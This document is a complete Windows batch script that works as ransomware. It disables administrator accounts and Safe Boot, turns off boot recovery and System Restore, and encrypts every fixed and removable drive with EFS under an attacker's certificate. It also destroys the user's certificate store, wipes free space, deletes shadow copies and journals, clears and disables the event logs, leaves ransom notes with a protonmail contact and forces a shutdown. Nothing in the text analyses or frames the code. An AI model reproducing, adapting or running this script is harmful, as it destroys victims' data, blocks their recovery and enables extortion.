@echo off

net user administrator /active:no
net user admin /active:no
net user администратор /active:no

reg delete HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot /f

setlocal enabledelayedexpansion

set "certutil="

if exist c:\windows\system32\certutil.exe (
  set certutil=c:\windows\system32\certutil.exe
) else (
  set certutil="%~dp0\certutil.exe"
)

attrib +H C:\Windows

echo Do not restart computer or decryption will not be possible. > c:\start.txt
echo Wait for file C:\end.txt to see contact information. >> c:\start.txt

bcdedit.exe /set {default} recoveryenabled no
bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable

for /l %%x in (1, 1, 20) do %certutil% -user -delstore my 0
cipher /K
%certutil% -user -delstore my 0

set I=0

for /f "skip=1 tokens=1,2" %%i in ('wmic logicaldisk get caption^, drivetype') do (
  set "TRUE="
  if [%%j]==[3] set TRUE=1
  if [%%j]==[4] set TRUE=1
  if defined TRUE (
    set /a I=!I! + 1
    set LINE!I!=%%i
  )
)

%certutil% -addstore root "%~dp0\cert.cer"

for /l %%c in (!I!,-1,1) do (
  set d=!LINE%%c!

  cipher /e /a /s:!d!\ /i /q
  cipher /adduser /certfile:"%~dp0\cert.cer" /s:!d!\

  for /l %%x in (1, 1, 20) do %certutil% -user -delstore my 0
)

cipher /f /d /a /s:C:\BOOT /h
cipher /f /d /a /s:C:\Windows /h

cscript "%~dp0\bootstrap.js"

%certutil% -addstore root "%~dp0\cert.cer"

for /l %%c in (!I!,-1,1) do (
  set d=!LINE%%c!

  cipher /e /a /s:!d!\ /i /q
  cipher /adduser /certfile:"%~dp0\cert.cer" /s:!d!\

  for /l %%x in (1, 1, 20) do %certutil% -user -delstore my 0
)

cipher /f /d /a /s:C:\Windows /h
cipher /f /d /a /s:C:\BOOT /h

for /l %%c in (!I!,-1,1) do (
  set d=!LINE%%c!

  cipher /w:!d!\
  echo y|vssadmin delete shadows /for=!d! /all /quiet
  fsutil.exe usn deletejournal /D !d!
)

cipher /flushcache

wevtutil.exe cl Application
wevtutil.exe cl System
wevtutil.exe cl Setup
wevtutil.exe cl Security
wevtutil.exe sl Security /e:false

echo To decrypt please contact script_java@protonmail.com > c:\end.txt

shutdown /s /f /p
shutdown /s
